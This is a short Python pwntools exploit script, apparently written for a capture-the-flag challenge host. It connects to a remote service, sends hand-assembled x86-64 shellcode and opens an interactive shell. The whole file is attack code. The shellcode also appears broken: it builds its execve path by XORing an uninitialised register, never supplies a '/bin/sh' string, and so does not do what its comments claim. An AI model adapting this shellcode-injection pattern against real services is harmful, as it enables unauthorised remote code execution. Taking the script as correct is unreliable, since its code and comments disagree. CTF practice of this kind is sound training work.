from pwn import *

# Target connection details
host = "challenge.htb"
port = 1337  # Replace with the correct port

# Shellcode that spawns a shell while avoiding restricted bytes
shellcode = (
    b"\x48\x31\xd2"                     # xor rdx, rdx
    b"\x48\x31\xf6"                     # xor rsi, rsi
    b"\x48\x31\xff"                     # xor rdi, rdi
    b"\x48\xbb\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a"  # mov rbx, 0x2a2a2a2a2a2a2a2a
    b"\x48\x31\xd8"                     # xor rax, rbx
    b"\x50"                              # push rax
    b"\x48\x89\xe7"                      # mov rdi, rsp
    b"\x48\x31\xc0"                     # xor rax, rax
    b"\xb0\x3a"                         # mov al, 0x3a
    b"\x48\xff\xc0"                     # inc rax
    b"\x0f\x05"                         # syscall
)

# Connect to the remote server
p = remote(host, port)

# Send the shellcode
p.sendline(shellcode)

# Open interactive shell
p.interactive()
